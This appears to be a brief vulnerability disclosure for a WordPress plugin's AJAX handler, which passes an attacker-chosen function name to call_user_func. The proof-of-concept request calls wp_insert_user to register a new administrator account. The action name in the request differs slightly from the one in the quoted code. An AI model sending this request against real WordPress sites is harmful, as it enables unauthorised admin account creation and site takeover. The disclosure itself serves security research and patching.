[-] Vulnerability Description:
This vulnerability allows any registered user to execute arbitrary functions

vulnerability code:
add_action('wp_ajax_wpdreams-ajaxinput', "wpdreams_ajaxinputcallback");
if (!function_exists("wpdreams_ajaxinputcallback")) {
    function wpdreams_ajaxinputcallback() {
	$param = $_POST;
	echo call_user_func($_POST['wpdreams_callback'], $param);
	exit;
    }
}

this will allow any registered user to execute any function he wants with 1st param set to array($_POST)
since wordpress core provides some functions that accept 1st param as an array then,wp_insert_user have a role option for the user you are inserting, this option can insert a new administrator

[-] Proof of Concept:
this will register an administrator with username "xADMIN" and password "xPASS"
url: http://localhost/x/wordpress/wp-admin/admin-ajax.php?page=ajax-search-pro/backend/settings.php&action=wpdreams-ajaxinputpost
data: wpdreams_callback=wp_insert_user&user_login=xADMIN&user_pass=xPASS&role=administrator
